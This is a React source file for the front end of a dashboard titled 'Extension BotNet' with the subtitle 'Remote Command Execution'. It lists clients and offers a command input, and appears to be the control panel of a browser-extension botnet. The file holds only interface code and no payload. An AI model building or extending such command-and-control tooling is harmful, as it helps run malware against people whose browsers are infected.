import React from 'react';
import {NextUIProvider} from "@nextui-org/react";
import ClientList from './components/ClientList';
import CommandInput from './components/CommandInput';
import {
    QueryClient,
    QueryClientProvider,
} from '@tanstack/react-query'

// Create a client
const queryClient = new QueryClient()

function QueryClientProviderWrapper() {
    return (
        <QueryClientProvider client={queryClient}>
            <NextUIProvider>
                <main className="dark bg-background text-foreground h-screen w-screen flex items-center justify-center">
                    <App />
                </main>
            </NextUIProvider>
        </QueryClientProvider>
    );
}

function App() {
    return (
        <div className="main-wrapper p-6">
            <h1 className="font-black text-4xl">Extension BotNet</h1>
            <h2 className="font-bold text-2xl text-success mb-10">$> Remote Command Execution</h2>
            <section className="body-wrapper flex lg:gap-3 gap-6 flex-wrap justify-center lg:justify-start">
                <ClientList />
                <CommandInput />
            </section>
        </div>
    );
}

export default QueryClientProviderWrapper;
